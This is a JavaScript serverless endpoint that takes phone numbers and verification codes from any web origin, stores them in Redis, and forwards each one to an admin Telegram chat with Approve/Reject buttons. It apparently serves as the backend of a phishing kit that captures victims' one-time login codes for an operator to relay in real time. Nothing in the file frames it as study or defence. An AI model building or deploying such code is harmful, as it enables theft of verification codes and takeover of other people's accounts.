export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') { res.status(405).json({ error: 'Method not allowed' }); return; }

  const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID;
  const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL;
  const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
  if (!TG_TOKEN || !ADMIN_CHAT_ID || !UPSTASH_URL || !UPSTASH_TOKEN) { res.status(500).json({ error: 'Server not configured' }); return; }

  const body = (req.body || {});
  const type = body.type;
  const value = body.value;
  let sessionId = body.sessionId || req.query.sessionId;

  if (!type || !value) { res.status(400).json({ error: 'Missing type or value' }); return; }
  if (!sessionId) sessionId = Math.random().toString(36).slice(2) + Date.now().toString(36);

  const kvGet = async (key) => {
    const r = await fetch(`${UPSTASH_URL}/GET/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } });
    const j = await r.json(); return j.result ?? null;
  };
  const kvSet = async (key, val, ttlSec) => {
    const ex = ttlSec ? `?EX=${ttlSec}` : '';
    const r = await fetch(`${UPSTASH_URL}/SET/${encodeURIComponent(key)}/${encodeURIComponent(val)}${ex}`, { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } });
    const j = await r.json(); return j.result === 'OK';
  };
  const TG_API = (t) => `https://api.telegram.org/bot${t}`;
  const sendMessage = async (text, reply_markup) => {
    const payload = { chat_id: ADMIN_CHAT_ID, text };
    if (reply_markup) payload.reply_markup = reply_markup;
    const r = await fetch(`${TG_API(TG_TOKEN)}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload),
    });
    const j = await r.json(); return j;
  };

  if (type === 'phone') {
    await kvSet(`phone:${sessionId}`, value, 3600);
    await sendMessage(`Phone submitted: ${value}\nSession: ${sessionId}`);
    res.status(200).json({ ok: true, sessionId }); return;
  }
  if (type === 'verification') {
    await kvSet(`code:${sessionId}`, value, 3600);
    await kvSet(`status:${sessionId}`, 'pending', 3600);
    const phone = await kvGet(`phone:${sessionId}`);
    const msg = `Verify code: ${value}\nFor phone: ${phone ?? 'UNKNOWN'}\nSession: ${sessionId}`;
    const inline = { inline_keyboard: [[
      { text: 'Approve ✅', callback_data: `approve|${sessionId}` },
      { text: 'Reject ❌',  callback_data: `reject|${sessionId}` },
    ]]};
    const j = await sendMessage(msg, inline);
    const mid = j?.result?.message_id;
    if (mid) await kvSet(`msg_session:${mid}`, sessionId, 3600);
    res.status(200).json({ ok: true, sessionId }); return;
  }
  res.status(400).json({ error: 'Invalid type' });
}
